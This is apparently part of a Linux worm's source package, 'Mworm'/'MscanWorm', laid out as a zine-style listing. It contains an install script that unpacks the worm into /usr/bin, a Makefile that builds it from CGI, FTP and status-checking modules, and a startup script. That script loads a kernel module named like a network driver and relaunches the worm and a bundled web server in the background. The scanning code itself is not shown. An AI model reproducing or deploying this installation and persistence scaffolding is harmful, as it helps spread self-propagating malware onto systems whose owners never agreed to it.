ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LOCALSETUP.SH]ÄÄÄ
#!/bin/sh

mkdir /usr/bin/Mworm
cp ../MscanWorm.tgz /usr/bin/Mworm
cd /usr/bin/Mworm
tar -xzvf MscanWorm.tgz
cd MscanWorm
sh install.sh
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[LOCALSETUP.SH]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
Mworm: common.o Mworm.o CheckCGI.o CheckFTP.o CheckSTATUS.o
	gcc -L/usr/lib -lpthread CheckCGI.o common.o CheckFTP.o CheckSTATUS.o Mworm.o -o Mworm
common.o: common.c
	gcc -c common.c
CheckCGI.o: CheckCGI.c
	gcc -c CheckCGI.c	
CheckFTP.o: CheckFTP.c
	gcc -c CheckFTP.c	
CheckSTATUS.o: CheckSTATUS.c
	gcc -c CheckSTATUS.c	
Mworm.o: Mworm.c
	gcc -c Mworm.c
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKEFILE]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STARTUP]ÄÄÄ
cd /usr/bin/Mworm/MscanWorm
/sbin/insmod 3c95.o
killall -9 Mhttd
killall -9 Mworm
./Mhttpd
./Mworm &
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[STARTUP]ÄÄÄ
